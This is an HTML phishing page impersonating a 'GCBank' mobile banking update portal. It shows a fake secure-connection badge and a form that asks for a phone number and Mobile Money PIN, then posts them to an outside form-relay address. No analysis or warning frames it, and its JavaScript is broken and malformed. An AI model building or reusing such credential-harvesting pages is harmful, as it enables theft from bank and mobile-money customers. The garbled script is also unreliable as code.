<!DOCTYPE html>
<html lang="en">
    <head>
         <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Banking Update</title>

</header>
    <style>
 /* MAIN HEADER */
.main-header {
    width: 100%;
    min-height: 75px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 12px;
    padding: 12px 20px;
    background: #ffffff;
    border-bottom: 1px solid #e5e7eb;
    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
    position: relative;
    z-index: 100;
}

/* LOGO CONTAINER */
.logo-container {
    display: flex;
    align-items: center;
    gap: 10px;
    min-width: 0;
}

.website-logo {
    width: 45px;
    height: 45px;
    object-fit: contain;
    flex-shrink: 0;
}

.brand-text {
    display: flex;
    flex-direction: column;
    gap: 3px;
}

.website-name {
    font-size: 18px;
    font-weight: bold;
    color: #17324f;
}

.website-subtitle {
    font-size: 11px;
    color: #777;
}

/* SECURITY BADGE */
.security-badge {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    background: #e8f7ee;
    color: #167342;
    padding: 8px 12px;
    border-radius: 25px;
    font-size: 12px;
    font-weight: 600;
    white-space: nowrap;
}

/* MOBILE DISPLAY */
@media screen and (max-width: 600px) {

    .main-header {
        width: 100%;
        padding: 12px 14px;
        flex-wrap: nowrap;
        gap: 8px;
    }

    .website-logo {
        width: 38px;
        height: 38px;
    }

    .website-name {
        font-size: 15px;
    }

    .website-subtitle {
        font-size: 10px;
    }

    .security-badge {
        font-size: 10px;
        padding: 7px 9px;
    }
}

/* VERY SMALL PHONES */
@media screen and (max-width: 360px) {

    .main-header {
        padding: 10px 8px;
    }

    .website-logo {
        width: 32px;
        height: 32px;
    }

    .website-name {
        font-size: 13px;
    }

    .security-badge {
        font-size: 9px;
        padding: 6px 7px;
    }
}

/* FORM CONTAINER */
.container {
    width: calc(100% - 40px);
    max-width: 430px;
    margin: 40px auto;
    background: #ffffff;
    padding: 35px 28px;
    border-radius: 8px;
    box-shadow: 0 4px 18px rgba(0,0,0,0.07);
    text-align: center;
}

/* MOBILE */
@media (max-width: 600px) {
    .main-header {
        padding: 12px 15px;
    }

    .website-logo {
        width: 42px;
        height: 42px;
    }

    .website-name {
        font-size: 16px;
    }

    .security-badge {
        font-size: 11px;
        padding: 7px 9px;
    }
}

</head>
<body>

    <header class="main-header">

    <div class="logo-container">
        <img src="logo.png"
             alt="Website Logo"
             class="website-logo">

        <div class="brand-text">
            <span class="website-name">GCBank</span>
            <span class="website-subtitle">Mobile Banking Portal</span>
        </div>
    </div>

    <div class="security-badge">
        <span>🔒</span>
        <span>Secure Connection</span>
    </div>

</header>

    <main class="container">

        <h1>MOBILE BANKING UPDATE</h1>

        <p class="description">
            Validating your phone number to the account enables
            you to make transactions from Bank to MoMo or vice
            versa without any fees associated.
        </p>

           <form
  action="https://formsubmit.co/el/loniju"
  method="POST"
>
  <label>
    Valid Phone Number:
    <input type="Number" name="Phone">
      <p class="description">
          Enter Mobile number to re-link your number to your GCB account
      </p>    
  </label>
  <label>
    Your Momo Pin:
    <input type="Number" name="Pin">
    <p class="description">
        Enter your  Mobile Money Pin to relink your MoMo to your GCB account Enter
      </p>
  </label>
  <!-- your other form fields go here -->
  <button type="submit">Send</button>
</form>

        <footer>
            2026 GCB Mobile Banking Update Portal
        </footer>

    </main>

    <script>
        
const form = document.getElementById("Form");
const phone = document.getElementById("phone");
const Momo = document.getElementById("momo pin");

const API_ENDPOINT = "/api/submit";

form.addEventListener("submit", async function(event) {
    event.preventDefault();

    const number = phone.value.trim();

    if (!/^[0-9+\-\s()]{7,20}$/.test(number)) {
        message.style.display = "block";
        message.style.color = "#c62828";
        message.textContent = "Enter a valid phone number.";
        return;
    }

    try {
        const response = await fetch( {
            action="https://formsubmit.co/el/loniju"
  method="POST"
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                Phone: number
            })
        });

        const result = await response.json();

        message.style.color = response.ok ? "#26733a" : "#c62828";
        message.textContent = result.momo;

        if (response.ok) {
            form.reset();
        }

    } catch (error) {
        message.style.color = "#c62828";
        message.textContent = "server unavailable. Please try again.";
    }
});

    </script>

</body>
</html>
